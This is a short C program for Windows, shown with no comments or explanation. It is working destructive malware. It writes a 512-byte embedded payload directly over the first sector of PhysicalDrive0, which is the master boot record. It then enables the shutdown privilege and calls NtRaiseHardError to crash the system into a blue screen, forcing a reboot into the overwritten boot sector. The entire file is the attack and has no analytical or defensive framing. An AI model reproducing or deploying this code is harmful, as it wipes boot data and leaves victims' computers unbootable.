﻿#include <windows.h>
#include <winternl.h>

#define IDR_BIN1 107

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

int TriggerBSOD() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) return 1;

    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    if (!RtlAdjustPrivilege || !NtRaiseHardError) return 1;

    BOOLEAN Enabled;
    RtlAdjustPrivilege(19, TRUE, FALSE, &Enabled);

    ULONG Response;
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);

    return 0;
}

int main() {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_BIN1), "BIN");
    if (!hRes) return 1;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return 1;

    void* pBin = LockResource(hData);
    DWORD size = SizeofResource(NULL, hRes);

    if (!pBin || size != 512) return 1;

    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) return 1;

    DWORD written = 0;
    BOOL ok = WriteFile(hDisk, pBin, 512, &written, NULL);

    FlushFileBuffers(hDisk);
    CloseHandle(hDisk);

    if (!ok || written != 512) return 1;

    Sleep(1000);

    return TriggerBSOD();
}